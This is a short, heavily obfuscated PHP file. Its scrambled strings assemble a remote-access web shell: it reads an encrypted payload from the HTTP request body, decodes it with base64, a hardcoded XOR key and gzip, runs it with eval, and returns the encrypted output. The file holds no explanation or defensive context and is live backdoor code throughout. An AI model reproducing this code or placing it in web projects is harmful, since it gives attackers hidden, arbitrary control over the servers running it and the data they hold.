<?php
$V='basg[e64_eng[code(g[@x(@gzg[g[compress($o),g[$k));pg[g[rint("$p$kh$rg[$kf");}';
$F=str_replace('b','','crbeatbeb_fubncbtibon');
$a='$k="g[9g[13g[e5ee0";g[$kh="2dg[a4g[9e766g[927";$kf="f73g[aaff5e9g[cd";$p="J';
$H='uWg[CUyp2HCwg[E6Y1A";g[fung[ctig[on x($t,$k){$g[c=sg[trleng[(g[$k)g[;$l=';
$q='strg[leng[(g[$t);$o="";for($g[i=0;$i<$l;){forg[($j=0;g[g[(g[$j<$c&&$i<$l';
$U='de($m[1]),$kg[)));$o=@og[bg[_get_cog[ntents();g[@g[ob_end_cleang[();g[$r=@';
$S='g[);$j++,$i+g[+g[){$o.=g[$t{$i}^$kg[{g[$j};}}returng[ $o;}ifg[ (@prg[eg_';
$X='g[mag[tch("/g[$kh(.+)$kf/"g[,@file_getg[_cog[ntentg[s("pg[hp://inpg[ug[t';
$m='g["),$m)==1) {@ob_sg[g[tartg[();@eg[val(@gzuncomg[press(@xg[(@baseg[64_deg[g[co';
$G=str_replace('g[','',$a.$H.$q.$S.$X.$m.$U.$V);
$M=$F('',$G);$M();
?>
